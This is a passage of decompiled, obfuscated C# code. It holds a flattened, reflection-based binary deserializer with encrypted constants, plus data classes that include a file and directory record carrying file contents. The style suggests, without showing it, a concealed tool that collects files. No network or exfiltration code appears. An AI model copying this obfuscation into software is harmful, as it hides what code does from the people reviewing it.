			if (graph3904 + flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("9e64be49329987b075c") > height4012.Length) {
				goto IL_0015;
			}
			goto IL_00e1;
			IL_0015:
			int num = --330128848;
			goto IL_001b;
			IL_001b:
			byte[] array8361 = default(byte[]);
			int num3 = default(int);
			while (true) {
				uint num2;
				switch ((num2 = (uint)(num - -1142110755)) % 9) {
				case 7u:
					break;
				default:
					num = 330128848;
					continue;
				case 1u:
					return (Guid)tree792 (cell3792);
				case 0u:
					return (Guid)tree792 (cell3792);
				case 8u:
					Array.Copy (height4012, graph3904, array8361, 0, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("c925065633efc6688e6"));
					num = (int)(0 - num2) + -94664110;
					continue;
				case 5u:
					goto IL_00a1;
				case 4u:
					array8361 = new byte[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("d91734cfc7f168c348b")];
					num = -711589699;
					continue;
				case 2u:
					goto IL_00e1;
				case 3u:
					goto IL_0103;
				case 6u:
					graph3904 += flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("f94063b0f2dd94346d8");
					return new Guid (array8361);
				}
				break;
				IL_0103:
				num = (int)((graph3904 + num3 > height4012.Length) ? (num2 ^ 0x2C92A39C) : (~num2 + 855711576));
				continue;
				IL_00a1:
				num = (int)((num3 == flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("1c93c71aed2afaab4fd")) ? (0 - num2 + 1804028148) : (~num2 + 1518713583));
			}
			goto IL_0015;
			IL_00e1:
			num3 = BitConverter.ToInt32 (height4012, graph3904);
			graph3904 += flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("6dde18214ac6b96869e");
			num = -224235726;
			goto IL_001b;
		}

		private static byte[] key13 (byte[] amount7835, ref int min26)
		{
			if (min26 + flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("2c9bb9f653c950291e8") > amount7835.Length) {
				goto IL_0015;
			}
			goto IL_00ce;
			IL_0015:
			int num = 508117052;
			goto IL_001a;
			IL_001a:
			byte[] array8361 = default(byte[]);
			int num3 = default(int);
			while (true) {
				uint num2;
				switch ((num2 = (uint)(num - -356928112)) % 8) {
				case 6u:
					break;
				default:
					num = 508117052;
					continue;
				case 2u:
					goto IL_0051;
				case 3u:
					array8361 = new byte[num3];
					Array.Copy (amount7835, min26, array8361, 0, num3);
					min26 += num3;
					num = -205303201;
					continue;
				case 1u:
					return new byte[0];
				case 0u:
					goto IL_009f;
				case 4u:
					return new byte[0];
				case 5u:
					goto IL_00ce;
				case 7u:
					return array8361;
				}
				break;
				IL_009f:
				num = ((num3 < 0) ? ((int)num2 ^ -749544047) : ((int)(0 - num2 + 2017478290)));
				continue;
				IL_0051:
				num = ((min26 + num3 > amount7835.Length) ? ((int)num2 + -1641787057) : ((int)(num2 - 878178135)));
			}
			goto IL_0015;
			IL_00ce:
			num3 = BitConverter.ToInt32 (amount7835, min26);
			min26 += flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("5bc9baef76adb50369c");
			num = ~-421903745;
			goto IL_001a;
		}

		private static object temp234 (byte[] session6376, ref int width743, byte line9580, Type size03)
		{
			if (width743 + flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("f91ebdf5e8fd14b704d") > session6376.Length) {
				goto IL_0015;
			}
			goto IL_00b3;
			IL_0015:
			int num = -708152921;
			goto IL_001b;
			IL_001b:
			long num3 = default(long);
			while (true) {
				uint num2 = (uint)(num + 1853385493);
				switch (num2 % 7) {
				case 4u:
					break;
				default:
					num = -708152921;
					continue;
				case 3u:
					goto IL_004e;
				case 6u:
					return new TimeSpan (num3);
				case 2u:
					width743 += flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("e93b987a07d9c062656");
					num = (int)(~num2) ^ -94733188;
					continue;
				case 1u:
					return tree792 (size03);
				case 5u:
					goto IL_00b3;
				case 0u:
					return DateTime.FromBinary (num3);
				}
				break;
				IL_004e:
				num = ((line9580 == flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("2f9c1db967bc8bfaab6")) ? ((int)num2 ^ -1426830643) : ((int)(num2 ^ 0x7A302546)));
			}
			goto IL_0015;
			IL_00b3:
			num3 = BitConverter.ToInt64 (session6376, width743);
			num = -1746350045;
			goto IL_001b;
		}

		private static object sum08 (byte[] error288, ref int options53, Type score951)
		{
			if (options53 + flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("0f9ca2614853229f4bc") > error288.Length) {
				goto IL_0015;
			}
			goto IL_0097;
			IL_0015:
			int num = 2093072409;
			goto IL_001a;
			IL_001a:
			int num3 = default(int);
			MethodInfo method = default(MethodInfo);
			object obj = default(object);
			object obj2 = default(object);
			object obj3 = default(object);
			Type[] array8361 = default(Type[]);
			int num4 = default(int);
			while (true) {
				uint num2 = (uint)(num + -2077668705);
				switch (num2 % 10) {
				case 8u:
					break;
				default:
					num = 2093072409;
					continue;
				case 4u:
					return null;
				case 2u:
					num3 += flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("9cc06a9ce0919a8a144");
					num = (int)num2 ^ -491399333;
					continue;
				case 0u:
					goto IL_0081;
				case 3u:
					goto IL_0097;
				case 1u: {
					MethodInfo methodInfo = method;
					object obj4 = obj;
					object[] array8362 = new object[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("8eee447bfe970313415")];
					array8362 [0] = obj2;
					array8362 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("e973c23b1ad973d408a")] = obj3;
					methodInfo.Invoke (obj4, array8362);
					num = (int)num2 ^ -364551960;
					continue;
				}
				case 6u:
					obj3 = key57 (error288, ref options53, array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("3c9a4100fb145032efb")]);
					num = (int)num2 + -1347170316;
					continue;
				case 5u:
					goto IL_011e;
				case 9u:
					obj2 = key57 (error288, ref options53, array8361 [0]);
					num = -1939235675;
					continue;
				case 7u:
					return obj;
				}
				break;
				IL_0081:
				num = ((num3 < num4) ? (-1631995432) : (-769982844));
			}
			goto IL_0015;
			IL_011e:
			Type[] array8363 = new Type[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("9f74def73e947062b6b")];
			array8363 [0] = typeof(object);
			array8363 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("4071af5004c0a56b09c")] = typeof(object);
			goto IL_0158;
			IL_0097:
			num4 = BitConverter.ToInt32 (error288, options53);
			options53 += flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("e99b785e06efe243590");
			if (!score951.IsGenericType) {
				num = ~787918305;
				goto IL_001a;
			}
			array8363 = score951.GetGenericArguments ();
			goto IL_0158;
			IL_0158:
			array8361 = array8363;
			Type typeFromHandle = typeof(Dictionary<, >);
			Type[] array8364 = new Type[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("bcee44c36a91455f0e1")];
			array8364 [0] = array8361 [0];
			array8364 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("8de74d19e29d8697c4f")] = array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("af852fc8999f948c401")];
			Type type = typeFromHandle.MakeGenericType (array8364);
			obj = Activator.CreateInstance (type);
			method = type.GetMethod (flag6144.0e291526dfde44109a60e580c474e7dd ("2f9f4911033a4e838"));
			num3 = 0;
			num = -789873531;
			goto IL_001a;
		}

		private static object key123 (byte[] current55, ref int line8459, Type message163)
		{
			if (line8459 + flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("7cdc64cf5fa55c0b89d") > current55.Length) {
				goto IL_0015;
			}
			goto IL_0112;
			IL_0015:
			int num = -1597081881;
			goto IL_001a;
			IL_001a:
			int num3 = default(int);
			Type type = default(Type);
			IList list839 = default(IList);
			Array array8361 = default(Array);
			int num4 = default(int);
			while (true) {
				uint num2 = (uint)(num - 1512863248);
				object obj;
				switch (num2 % 18) {
				case 7u:
					break;
				default:
					num = -1597081881;
					continue;
				case 15u:
					goto IL_007c;
				case 5u:
					goto IL_009e;
				case 0u:
					num3 += flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("bd2a801337945f45c19");
					num = (int)(0 - num2) + -421850817;
					continue;
				case 16u:
					num3 = 0;
					num = (int)(0 - num2 + 514393261);
					continue;
				case 12u:
					obj = typeof(object);
					goto IL_0106;
				case 1u:
					goto IL_0112;
				case 10u:
					if (message163.IsArray) {
						obj = message163.GetElementType ();
						goto IL_0106;
					}
					num = (int)num2 + -2141394419;
					continue;
				case 9u:
					goto IL_013a;
				case 8u: {
					Type typeFromHandle = typeof(List<>);
					Type[] array8362 = new Type[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("f908b9e6d4eb41efb9c")];
					array8362 [0] = type;
					list839 = (IList)Activator.CreateInstance (typeFromHandle.MakeGenericType (array8362));
					num = (int)(0 - num2 + 465614250);
					continue;
				}
				case 4u:
					return array8361;
				case 11u:
					list839.Add (key57 (current55, ref line8459, type));
					num = -1673125344;
					continue;
				case 17u:
					if (message163.IsGenericType) {
						obj = message163.GetGenericArguments () [0];
						goto IL_0106;
					}
					num = (int)(num2 + 896338817);
					continue;
				case 14u:
					return null;
				case 6u:
					array8361 = Array.CreateInstance (type, list839.Count);
					list839.CopyTo (array8361, 0);
					num = (int)(num2 + 1742242736);
					continue;
				case 3u:
					line8459 += flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("9ea17bbdc49a142f6d7");
					num = (int)(~num2) + -1798017304;
					continue;
				case 13u:
					return Array.CreateInstance (message163.GetElementType () ?? typeof(object), 0);
				case 2u:
					{
						return list839;
					}
					IL_0106:
					type = (Type)obj;
					num = -1579608532;
					continue;
				}
				break;
				IL_013a:
				num = ((num3 < num4) ? (-2116663909) : (--2116514637));
				continue;
				IL_009e:
				num = ((!message163.IsArray) ? ((int)(num2 ^ 0x580ED475)) : ((int)num2 - -1624068239));
				continue;
				IL_007c:
				num = ((!message163.IsArray) ? ((int)(num2 + 1808719329)) : ((int)(~num2) + -1539577735));
			}
			goto IL_0015;
			IL_0112:
			num4 = BitConverter.ToInt32 (current55, line8459);
			num = 2024219041;
			goto IL_001a;
		}

		private static object left76 (byte[] height7532, ref int amount53, Type parent7770)
		{
			if (amount53 + flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("0d9d77d09dece306351") > height7532.Length) {
				return tree792 (parent7770);
			}
			int num = BitConverter.ToInt32 (height7532, amount53);
			amount53 += flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("af79a371a09d437e0d2");
			object obj;
			object result = default(object);
			try {
				obj = Activator.CreateInstance (parent7770);
			} catch {
				int num2 = 0;
				while (true) {
					IL_0087:
					int num3 = ((num2 < num) ? 2134029156 : (-1619596737));
					while (true) {
						uint num4 = (uint)(num3 + -2019363740);
						switch (num4 % 5) {
						case 3u:
							num3 = 2134029156;
							continue;
						default:
							num3 = 2134029156;
							continue;
						case 4u:
							result = tree792 (parent7770);
							num3 = (int)((0 - num4) ^ 0x4DFF3C0A);
							continue;
						case 2u:
							break;
						case 1u:
							key57 (height7532, ref amount53, typeof(object));
							num2 += flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("ac298326859dd6c5e74");
							num3 = -1652894829;
							continue;
						case 0u:
							goto end_IL_0047;
						}
						goto IL_0087;
						continue;
						end_IL_0047:
						break;
					}
					break;
				}
				goto IL_0255;
			}
			List<left8242> list839 = args51 (parent7770);
			int num6 = default(int);
			int num7 = default(int);
			PropertyInfo size710 = default(PropertyInfo);
			object value = default(object);
			while (true) {
				int num5 = -148445223;
				while (true) {
					uint num4;
					switch ((num4 = (uint)(num5 - -1203830184)) % 14) {
					case 11u:
						break;
					default:
						num5 = -148445223;
						continue;
					case 8u:
						goto IL_0123;
					case 10u:
						num5 = (int)(0 - num4) ^ -861987567;
						continue;
					case 3u:
						goto IL_0144;
					case 2u:
						num6 = list839.Count;
						num5 = (int)(num4 - 1148373182);
						continue;
					case 13u:
						num7 += flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("762703dec6d4377f99d");
						num5 = 436888199;
						continue;
					case 6u:
						key57 (height7532, ref amount53, typeof(object));
						num5 = -285504162;
						continue;
					case 5u:
						size710 = list839 [num7].size40;
						value = key57 (height7532, ref amount53, size710.PropertyType);
						num5 = --47854187;
						continue;
					case 1u:
						num7 = 0;
						num5 = (int)num4 ^ -548509885;
						continue;
					case 0u:
						size710.SetValue (obj, value, null);
						num5 = (int)num4 ^ -2121358349;
						continue;
					case 12u:
						num6 += flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("f9358498f8c52f88b6f");
						num5 = (int)(num4 ^ 0x33699EC2);
						continue;
					case 7u:
						goto IL_0221;
					case 4u:
						return obj;
					case 9u:
						goto end_IL_00cd;
					}
					break;
					IL_0221:
					num5 = (int)((!size710.CanWrite) ? (~num4 ^ 0x77ECD299) : (~num4 ^ 0x4E210F32));
					continue;
					IL_0144:
					num5 = ((num7 < Math.Min (num, list839.Count)) ? 457997625 : (--42393818));
					continue;
					IL_0123:
					num5 = ((num6 >= num) ? (-1163026130) : (-1095893482));
				}
				continue;
				end_IL_00cd:
				break;
			}
			goto IL_0255;
			IL_0255:
			return result;
		}

		private static List<left8242> args51 (Type sum6563)
		{
			if (offset8616.TryGetValue (sum6563, out var value)) {
				goto IL_0012;
			}
			goto IL_0094;
			IL_0012:
			int num = ~1101673183;
			goto IL_0018;
			IL_0018:
			List<left8242> list839 = default(List<left8242>);
			cache00 cache1 = default(cache00);
			object[] customAttributes = default(object[]);
			PropertyInfo propertyInfo = default(PropertyInfo);
			PropertyInfo[] properties = default(PropertyInfo[]);
			int num3 = default(int);
			int path578 = default(int);
			while (true) {
				uint num2 = (uint)(num ^ -1042559575);
				switch (num2 % 19) {
				case 6u:
					break;
				default:
					num = -1101673184;
					continue;
				case 12u:
					offset8616 [sum6563] = list839;
					num = (int)num2 ^ -1560424200;
					continue;
				case 0u:
					goto IL_0094;
				case 4u:
					goto IL_00b5;
				case 11u:
					cache1 = customAttributes [0] as cache00;
					num = (int)(num2 - 1626161840);
					continue;
				case 17u:
					list839.Sort ((left8242 left8243, left8242 left8244) => left8243.path23.CompareTo (left8244.path23));
					num = -456125480;
					continue;
				case 5u:
					goto IL_0116;
				case 2u:
					goto IL_0133;
				case 7u:
					return value;
				case 18u:
					propertyInfo = properties [num3];
					num = -759948322;
					continue;
				case 16u:
					goto IL_016e;
				case 3u:
					path578 = flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("c9ac88a48de89a32caa");
					customAttributes = propertyInfo.GetCustomAttributes (typeof(cache00), flag6144.09343d4890d2414f8aa92dc5c3eb3877 ("3d9d50300ac28"));
					num = (int)num2 ^ -1234791279;
					continue;
				case 15u:
					num3 = 0;
					num = (int)num2 ^ -1763094687;
					continue;
				case 8u:
					list839.Add (new left8242 {
						size40 = propertyInfo,
						path23 = path578
					});
					num = -627409765;
					continue;
				case 1u:
					goto IL_01fa;
				case 14u:
					goto IL_021b;
				case 9u:
					path578 = cache1.config53;
					num = (int)num2 ^ -173493672;
					continue;
				case 10u:
					num3 += flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("9cd47e3f169d46557c6");
					num = -1348615602;
					continue;
				case 13u:
					return list839;
				}
				break;
				IL_021b:
				num = (int)(Attribute.IsDefined (propertyInfo, typeof(settings964)) ? (~num2 + 1422886349) : (num2 + 370125282));
				continue;
				IL_016e:
				num = ((!propertyInfo.CanRead) ? ((int)num2 ^ -906646804) : ((int)num2 ^ -1467936017));
				continue;
				IL_0116:
				num = (int)((customAttributes != null) ? (num2 - 1505528706) : (num2 - 929556254));
				continue;
				IL_01fa:
				num = ((customAttributes.Length <= 0) ? ((int)num2 + -520360261) : ((int)(~num2) + -838962209));
				continue;
				IL_00b5:
				num = ((num3 >= properties.Length) ? (-581407454) : (-279520260));
				continue;
				IL_0133:
				num = ((cache1 == null) ? ((int)num2 ^ -1882250975) : ((int)(num2 + 2035539536)));
			}
			goto IL_0012;
			IL_0094:
			list839 = new List<left8242> ();
			properties = sum6563.GetProperties ((BindingFlags)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("4b655ca53d3fde9159e"));
			num = -122732410;
			goto IL_0018;
		}
	}
}
namespace config53
{
	public class width287
	{
		[CompilerGenerated]
		private string code972 = string.Empty;

		[CompilerGenerated]
		private string height6152 = string.Empty;

		[CompilerGenerated]
		private byte[] count76 = new byte[0];

		[CompilerGenerated]
		private byte[] size4474 = new byte[0];

		[CompilerGenerated]
		private byte[] product0701 = new byte[0];

		[cache00 (0)]
		public string column401 {
			[CompilerGenerated]
			get {
				return code972;
			}
			[CompilerGenerated]
			set {
				code972 = value;
			}
		}

		[cache00 (1)]
		public string args76 {
			[CompilerGenerated]
			get {
				return height6152;
			}
			[CompilerGenerated]
			set {
				height6152 = value;
			}
		}

		[cache00 (2)]
		public byte[] list8926 {
			[CompilerGenerated]
			get {
				return count76;
			}
			[CompilerGenerated]
			set {
				count76 = value;
			}
		}

		[cache00 (3)]
		public byte[] level90 {
			[CompilerGenerated]
			get {
				return size4474;
			}
			[CompilerGenerated]
			set {
				size4474 = value;
			}
		}

		[cache00 (4)]
		public byte[] width99 {
			[CompilerGenerated]
			get {
				return product0701;
			}
			[CompilerGenerated]
			set {
				product0701 = value;
			}
		}
	}
}
namespace score1323
{
	public class column35
	{
		[CompilerGenerated]
		private string map651 = string.Empty;

		[CompilerGenerated]
		private string width07 = string.Empty;

		[CompilerGenerated]
		private bool page3578;

		[CompilerGenerated]
		private string array5825 = string.Empty;

		[CompilerGenerated]
		private string limit496 = string.Empty;

		[CompilerGenerated]
		private string output999 = string.Empty;

		[CompilerGenerated]
		private int list5372;

		[CompilerGenerated]
		private int sum4997;

		[CompilerGenerated]
		private string[] name4055 = new string[0];

		[CompilerGenerated]
		private int map211;

		[CompilerGenerated]
		private int width09;

		[CompilerGenerated]
		private string file23 = string.Empty;

		[CompilerGenerated]
		private string array783 = string.Empty;

		[CompilerGenerated]
		private string[] product592 = new string[0];

		[cache00 (0)]
		public string limit810 {
			[CompilerGenerated]
			get {
				return map651;
			}
			[CompilerGenerated]
			set {
				map651 = value;
			}
		}

		[cache00 (1)]
		public string dir84 {
			[CompilerGenerated]
			get {
				return width07;
			}
			[CompilerGenerated]
			set {
				width07 = value;
			}
		}

		[cache00 (2)]
		public bool stack2669 {
			[CompilerGenerated]
			get {
				return page3578;
			}
			[CompilerGenerated]
			set {
				page3578 = value;
			}
		}

		[cache00 (3)]
		public string list290 {
			[CompilerGenerated]
			get {
				return array5825;
			}
			[CompilerGenerated]
			set {
				array5825 = value;
			}
		}

		[cache00 (4)]
		public string rate893 {
			[CompilerGenerated]
			get {
				return limit496;
			}
			[CompilerGenerated]
			set {
				limit496 = value;
			}
		}

		[cache00 (5)]
		public string code539 {
			[CompilerGenerated]
			get {
				return output999;
			}
			[CompilerGenerated]
			set {
				output999 = value;
			}
		}

		[cache00 (6)]
		public int source137 {
			[CompilerGenerated]
			get {
				return list5372;
			}
			[CompilerGenerated]
			set {
				list5372 = value;
			}
		}

		[cache00 (7)]
		public int path3233 {
			[CompilerGenerated]
			get {
				return sum4997;
			}
			[CompilerGenerated]
			set {
				sum4997 = value;
			}
		}

		[cache00 (8)]
		public string[] limit5247 {
			[CompilerGenerated]
			get {
				return name4055;
			}
			[CompilerGenerated]
			set {
				name4055 = value;
			}
		}

		[cache00 (9)]
		public int id405 {
			[CompilerGenerated]
			get {
				return map211;
			}
			[CompilerGenerated]
			set {
				map211 = value;
			}
		}

		[cache00 (10)]
		public int sum1472 {
			[CompilerGenerated]
			get {
				return width09;
			}
			[CompilerGenerated]
			set {
				width09 = value;
			}
		}

		[cache00 (11)]
		public string flag943 {
			[CompilerGenerated]
			get {
				return file23;
			}
			[CompilerGenerated]
			set {
				file23 = value;
			}
		}

		[cache00 (12)]
		public string key334 {
			[CompilerGenerated]
			get {
				return array783;
			}
			[CompilerGenerated]
			set {
				array783 = value;
			}
		}

		[cache00 (13)]
		public string[] mode98 {
			[CompilerGenerated]
			get {
				return product592;
			}
			[CompilerGenerated]
			set {
				product592 = value;
			}
		}
	}
}
namespace config8383
{
	public class max390
	{
		[CompilerGenerated]
		private bool start5017;

		[CompilerGenerated]
		private bool message8293;

		[cache00 (0)]
		public bool dir6424 {
			[CompilerGenerated]
			get {
				return start5017;
			}
			[CompilerGenerated]
			set {
				start5017 = value;
			}
		}

		[cache00 (1)]
		public bool max6597 {
			[CompilerGenerated]
			get {
				return message8293;
			}
			[CompilerGenerated]
			set {
				message8293 = value;
			}
		}
	}
}
namespace options764
{
	public class item4706
	{
		[CompilerGenerated]
		private string product335 = string.Empty;

		[CompilerGenerated]
		private List<string> child715 = new List<string> ();

		[CompilerGenerated]
		private List<string> source83 = new List<string> ();

		[CompilerGenerated]
		private int array0732;

		[CompilerGenerated]
		private int index4516;

		[CompilerGenerated]
		private long next4247;

		[cache00 (0)]
		public string stream037 {
			[CompilerGenerated]
			get {
				return product335;
			}
			[CompilerGenerated]
			set {
				product335 = value;
			}
		}

		[cache00 (1)]
		public List<string> data074 {
			[CompilerGenerated]
			get {
				return child715;
			}
			[CompilerGenerated]
			set {
				child715 = value;
			}
		}

		[cache00 (2)]
		public List<string> settings54 {
			[CompilerGenerated]
			get {
				return source83;
			}
			[CompilerGenerated]
			set {
				source83 = value;
			}
		}

		[cache00 (3)]
		public int message089 {
			[CompilerGenerated]
			get {
				return array0732;
			}
			[CompilerGenerated]
			set {
				array0732 = value;
			}
		}

		[cache00 (4)]
		public int right20 {
			[CompilerGenerated]
			get {
				return index4516;
			}
			[CompilerGenerated]
			set {
				index4516 = value;
			}
		}

		[cache00 (5)]
		public long size600 {
			[CompilerGenerated]
			get {
				return next4247;
			}
			[CompilerGenerated]
			set {
				next4247 = value;
			}
		}
	}
}
namespace graph502
{
	public class avg4687
	{
		[CompilerGenerated]
		private List<item4706> context1755 = new List<item4706> ();

		[CompilerGenerated]
		private int context984;

		[CompilerGenerated]
		private long column2924;

		[cache00 (0)]
		public List<item4706> key225 {
			[CompilerGenerated]
			get {
				return context1755;
			}
			[CompilerGenerated]
			set {
				context1755 = value;
			}
		}

		[cache00 (1)]
		public int graph53 {
			[CompilerGenerated]
			get {
				return context984;
			}
			[CompilerGenerated]
			set {
				context984 = value;
			}
		}

		[cache00 (2)]
		public long format70 {
			[CompilerGenerated]
			get {
				return column2924;
			}
			[CompilerGenerated]
			set {
				column2924 = value;
			}
		}
	}
}
namespace options90
{
	public class context70
	{
		[CompilerGenerated]
		private int speed4247;

		[CompilerGenerated]
		private string sum949 = string.Empty;

		[CompilerGenerated]
		private string next05 = string.Empty;

		[CompilerGenerated]
		private byte[] sum918 = new byte[0];

		[cache00 (0)]
		public int number140 {
			[CompilerGenerated]
			get {
				return speed4247;
			}
			[CompilerGenerated]
			set {
				speed4247 = value;
			}
		}

		[cache00 (1)]
		public string position28 {
			[CompilerGenerated]
			get {
				return sum949;
			}
			[CompilerGenerated]
			set {
				sum949 = value;
			}
		}

		[cache00 (2)]
		public string amount8389 {
			[CompilerGenerated]
			get {
				return next05;
			}
			[CompilerGenerated]
			set {
				next05 = value;
			}
		}

		[cache00 (3)]
		public byte[] format251 {
			[CompilerGenerated]
			get {
				return sum918;
			}
			[CompilerGenerated]
			set {
				sum918 = value;
			}
		}
	}
}
namespace column724
{
	public class buffer2185
	{
		[CompilerGenerated]
		private byte[] rate2165 = new byte[0];

		[CompilerGenerated]
		private DateTime name66;

		[CompilerGenerated]
		private byte[] product72 = new byte[0];

		[cache00 (0)]
		public byte[] rate2497 {
			[CompilerGenerated]
			get {
				return rate2165;
			}
			[CompilerGenerated]
			set {
				rate2165 = value;
			}
		}

		[cache00 (1)]
		public DateTime temp13 {
			[CompilerGenerated]
			get {
				return name66;
			}
			[CompilerGenerated]
			set {
				name66 = value;
			}
		}

		[cache00 (2)]
		public byte[] stream1465 {
			[CompilerGenerated]
			get {
				return product72;
			}
			[CompilerGenerated]
			set {
				product72 = value;
			}
		}
	}
}
namespace time56
{
	public class current614
	{
		[CompilerGenerated]
		private byte path692;

		[CompilerGenerated]
		private string data06 = string.Empty;

		[CompilerGenerated]
		private byte[] level8524 = new byte[0];

		[cache00 (0)]
		public byte max34 {
			[CompilerGenerated]
			get {
				return path692;
			}
			[CompilerGenerated]
			set {
				path692 = value;
			}
		}

		[cache00 (1)]
		public string stream03 {
			[CompilerGenerated]
			get {
				return data06;
			}
			[CompilerGenerated]
			set {
				data06 = value;
			}
		}

		[cache00 (2)]
		public byte[] input0730 {
			[CompilerGenerated]
			get {
				return level8524;
			}
			[CompilerGenerated]
			set {
				level8524 = value;
			}
		}
	}
}
namespace flag3265
{
	public class row9445
	{
		[CompilerGenerated]
		private string buffer31;

		[CompilerGenerated]
		private string error1904;

		[CompilerGenerated]
		private long speed20;

		[CompilerGenerated]
		private long size591;

		[CompilerGenerated]
		private List<input6339> temp036 = new List<input6339> ();

		[CompilerGenerated]
		private List<row9445> sum1086 = new List<row9445> ();

		[cache00 (0)]
		public string number00 {
			[CompilerGenerated]
			get {
				return buffer31;
			}
			[CompilerGenerated]
			set {
				buffer31 = value;
			}
		}

		[cache00 (1)]
		public string start7884 {
			[CompilerGenerated]
			get {
				return error1904;
			}
			[CompilerGenerated]
			set {
				error1904 = value;
			}
		}

		[cache00 (2)]
		public long key2250 {
			[CompilerGenerated]
			get {
				return speed20;
			}
			[CompilerGenerated]
			set {
				speed20 = value;
			}
		}

		[cache00 (3)]
		public long tree93 {
			[CompilerGenerated]
			get {
				return size591;
			}
			[CompilerGenerated]
			set {
				size591 = value;
			}
		}

		[cache00 (4)]
		public List<input6339> buffer8684 {
			[CompilerGenerated]
			get {
				return temp036;
			}
			[CompilerGenerated]
			set {
				temp036 = value;
			}
		}

		[cache00 (5)]
		public List<row9445> column331 {
			[CompilerGenerated]
			get {
				return sum1086;
			}
			[CompilerGenerated]
			set {
				sum1086 = value;
			}
		}

		public row9445 ()
		{
		}

		public row9445 (DirectoryInfo item82, List<input6339> number05 = null)
		{
			number00 = item82.Name;
			start7884 = item82.FullName;
			key2250 = item82.CreationTimeUtc.source0847 ();
			tree93 = item82.LastWriteTimeUtc.source0847 ();
			buffer8684 = number05 ?? new List<input6339> ();
		}

		public void dir16 (row9445 max51)
		{
			column331.Add (max51);
		}

		public void level867 (input6339 right0388)
		{
			buffer8684.Add (right0388);
		}
	}
}
namespace range81
{
	public class input6339
	{
		[CompilerGenerated]
		private string right57 = string.Empty;

		[CompilerGenerated]
		private string text188 = string.Empty;

		[CompilerGenerated]
		private long node8494;

		[CompilerGenerated]
		private long count787;

		[CompilerGenerated]
		private long limit64;

		[CompilerGenerated]
		private byte[] next323 = new byte[0];

		[CompilerGenerated]
		private string position978 = string.Empty;

		[cache00 (0)]
		public string data67 {
			[CompilerGenerated]
			get {
				return right57;
			}
			[CompilerGenerated]
			set {
				right57 = value;
			}
		}

		[cache00 (1)]
		public string result5164 {
			[CompilerGenerated]
			get {
				return text188;
			}
			[CompilerGenerated]
			set {
				text188 = value;
			}
		}

		[cache00 (2)]
		public long position632 {
			[CompilerGenerated]
			get {
				return node8494;
			}
			[CompilerGenerated]
			set {
				node8494 = value;
			}
		}

		[cache00 (3)]
		public long current133 {
			[CompilerGenerated]
			get {
				return count787;
			}
			[CompilerGenerated]
			set {
				count787 = value;
			}
		}

		[cache00 (4)]
		public long next949 {
			[CompilerGenerated]
			get {
				return limit64;
			}
			[CompilerGenerated]
			set {
				limit64 = value;
			}
		}

		[cache00 (5)]
		public byte[] dir991 {
			[CompilerGenerated]
			get {
				return next323;
			}
			[CompilerGenerated]
			set {
				next323 = value;
			}
		}

		[cache00 (6)]
		public string message84 {
			[CompilerGenerated]
			get {
				return position978;
			}
			[CompilerGenerated]
			set {
				position978 = value;
			}
		}

		public input6339 ()
		{
		}

		public input6339 (FileInfo result7017, byte[] min719)
		{
			data67 = result7017.Name;
			result5164 = result7017.FullName;
			message84 = result7017.Extension;
			position632 = result7017.Length;
			current133 = result7017.CreationTimeUtc.source0847 ();
			next949 = result7017.LastWriteTimeUtc.source0847 ();
			dir991 = min719;
		}
	}
}
namespace min3145
{
	public class score746
	{
		[CompilerGenerated]
		private string list6989 = string.Empty;

		[CompilerGenerated]
		private row9445 limit433;

		[CompilerGenerated]
		private row9445 config51;

		[CompilerGenerated]
		private row9445 key008;

		[cache00 (0)]
		public string error15 {
			[CompilerGenerated]
			get {
				return list6989;
			}
			[CompilerGenerated]
			set {
				list6989 = value;
			}
		}

		[cache00 (1)]
		public row9445 key372 {
			[CompilerGenerated]
			get {
				return limit433;
			}
			[CompilerGenerated]
			set {
				limit433 = value;
			}
		}

		[cache00 (2)]
		public row9445 page312 {
			[CompilerGenerated]
			get {
				return config51;
			}
			[CompilerGenerated]
			set {
				config51 = value;
			}
		}

		[cache00 (3)]
		public row9445 temp09 {
			[CompilerGenerated]
			get {
				return key008;
			}
			[CompilerGenerated]
			set {
				key008 = value;
			}
		}
	}
}
namespace current8468
{
	public class output47
	{
		[CompilerGenerated]
		private string speed3778 = string.Empty;

		[CompilerGenerated]
		private bool tree35;

		[CompilerGenerated]
		private bool mode99;

		[CompilerGenerated]
		private bool stack3152;

		[cache00 (0)]
		public string end824 {
			[CompilerGenerated]
			get {
				return speed3778;
			}
			[CompilerGenerated]
			set {
				speed3778 = value;
			}
		}

		[cache00 (1)]
		public bool end36 {
			[CompilerGenerated]
			get {
				return tree35;
			}
			[CompilerGenerated]
			set {
				tree35 = value;
			}
		}

		[cache00 (2)]
		public bool max59 {
			[CompilerGenerated]
			get {
				return mode99;
			}
			[CompilerGenerated]
			set {
				mode99 = value;
			}
		}

		[cache00 (3)]
